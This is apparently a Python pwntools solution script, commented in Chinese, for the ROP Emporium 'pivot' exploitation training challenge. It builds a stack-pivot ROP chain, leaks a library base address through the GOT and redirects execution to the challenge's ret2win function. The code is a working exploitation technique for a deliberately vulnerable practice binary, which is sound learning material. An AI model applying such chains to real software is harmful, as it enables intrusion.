#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ROP Emporium "pivot" —— 栈迁移（stack pivot）+ 两阶段 leak libpivot

题目：64 位 ELF + 自带 `libpivot.so`。main 会 malloc 一块 16MB 的堆，
      把 `heap+0xFFFF00` 作为 "pivot 地址" 打印出来，然后把第一次 `read`
      的长链写到这块堆上；第二次 `read(0, rbp-0x20, 0x40)` 才是栈溢出。
保护：No PIE / NX / 无 canary / partial RELRO。

核心：
  usefulGadgets @0x4009bb: pop rax; ret
                  @0x4009bd: xchg rsp, rax; ret     <-- 一次 xchg 完成栈迁移
                  @0x4009c0: mov rax, [rax]; ret
                  @0x4009c4: add rax, rbp; ret

两阶段：
  阶段 1：栈溢出只够 3 个 qword —— pop rax / pivot_addr / xchg rsp,rax
          -> 栈迁到堆上，执行 CSU 链：
             1) 调 foothold_function@plt 让懒绑定把 GOT 填成真实地址
             2) puts(foothold@got) 泄漏 libpivot 基址
             3) ret 回 main 再玩一轮
  阶段 2：pivot_addr = libpivot_base + 0xa81 (ret2win)，同样迁移过去直接 ret

关键偏移：libpivot.so 里 foothold_function=0x96a，ret2win=0xa81，差 0x117。
"""

import sys

from pwn import *

context(os="linux", arch="amd64", log_level="info")

BIN = "./pivot"
HOST, PORT = "ropemporium.com", 0  # 官方无公开远程，保留占位

# ---- pivot 里的 usefulGadgets ----
POP_RAX = 0x4009BB      # pop rax; ret
XCHG_RSP_RAX = 0x4009BD  # xchg rsp, rax; ret
MOV_RAX_PTR = 0x4009C0   # mov rax, [rax]; ret
ADD_RAX_RBP = 0x4009C4   # add rax, rbp; ret

# ---- __libc_csu_init ----
CSU_POP = 0x400A2A       # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL = 0x400A10      # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]; ...

MAIN = 0x400847
FOOTHOLD_GOT = 0x601040
PUTS_GOT = 0x601020

OFF_FOOTHOLD = 0x96A
OFF_RET2WIN = 0xA81

# 注意：CSU 的 `call [r12+rbx*8]` 是"内存间接调用"，r12 必须放 GOT 项地址。
# 传 foothold_function@plt (0x400720) 会变成 call [0x400720]，把代码字节当地址 -> 崩。


def start() -> tube:
    if len(sys.argv) > 1 and sys.argv[1].upper() == "REMOTE":
        return remote(HOST, PORT)
    return process(BIN)


def csu_call(func_got: int, arg: int = 0) -> bytes:
    """用 CSU 调 func_got(arg)：rdi=arg, rsi=0, rdx=0"""
    return (
        p64(CSU_POP)
        + p64(0)          # rbx = 0  -> [r12 + rbx*8] = [r12]
        + p64(1)          # rbp = 1  -> 循环一次后退出
        + p64(func_got)   # r12 = 函数指针
        + p64(arg)        # r13 -> edi（参数，只取低 32 位）
        + p64(0)          # r14 -> rsi
        + p64(0)          # r15 -> rdx
        + p64(CSU_CALL)
        + p64(0)          # add rsp,8 跳过的槽
        + p64(0) * 6      # pop rbx, rbp, r12, r13, r14, r15
    )


def pwn() -> None:
    io = start()

    # ================= 阶段 1：leak libpivot 基址 =================
    io.recvuntil(b"place to pivot: ")
    pivot = int(io.recvline().strip(), 16)
    log.success("pivot stack (heap): %#x", pivot)

    chain = b""
    chain += csu_call(FOOTHOLD_GOT)                      # call [foothold@got]：触发懒绑定
    chain += csu_call(PUTS_GOT, FOOTHOLD_GOT)            # puts(foothold@got)
    chain += p64(MAIN)                                   # 回 main 再来一轮
    assert len(chain) <= 0x100, len(chain)
    log.info("stage-1 chain: %d bytes", len(chain))

    io.recvuntil(b"land there")
    io.recvuntil(b"> ")
    io.send(chain)                                       # 写到 heap pivot 地址

    # 栈溢出：0x28 到 saved RIP，只放 3 个 qword 完成迁移
    io.recvuntil(b"Now please send your stack smash")
    io.recvuntil(b"> ")
    io.send(b"A" * 0x28 + p64(POP_RAX) + p64(pivot) + p64(XCHG_RSP_RAX))

    # ================= 解析 leak =================
    io.recvuntil(b"into libpivot\n")                     # foothold 的打印
    raw = io.recvline().strip(b"\n")
    leak = u64(raw.ljust(8, b"\x00"))
    libpivot = leak - OFF_FOOTHOLD
    ret2win = libpivot + OFF_RET2WIN
    log.success("foothold @ %#x -> libpivot @ %#x", leak, libpivot)
    log.success("ret2win  @ %#x", ret2win)

    # ================= 阶段 2：迁移到 heap 直接 ret2win =================
    io.recvuntil(b"place to pivot: ")
    pivot2 = int(io.recvline().strip(), 16)
    log.info("pivot stack #2: %#x", pivot2)

    io.recvuntil(b"land there")
    io.recvuntil(b"> ")
    io.send(p64(ret2win))                                # heap 链只有一条返回地址

    io.recvuntil(b"Now please send your stack smash")
    io.recvuntil(b"> ")
    io.send(b"A" * 0x28 + p64(POP_RAX) + p64(pivot2) + p64(XCHG_RSP_RAX))

    print(io.recvall(timeout=2).decode(errors="replace"))
    io.close()


if __name__ == "__main__":
    pwn()
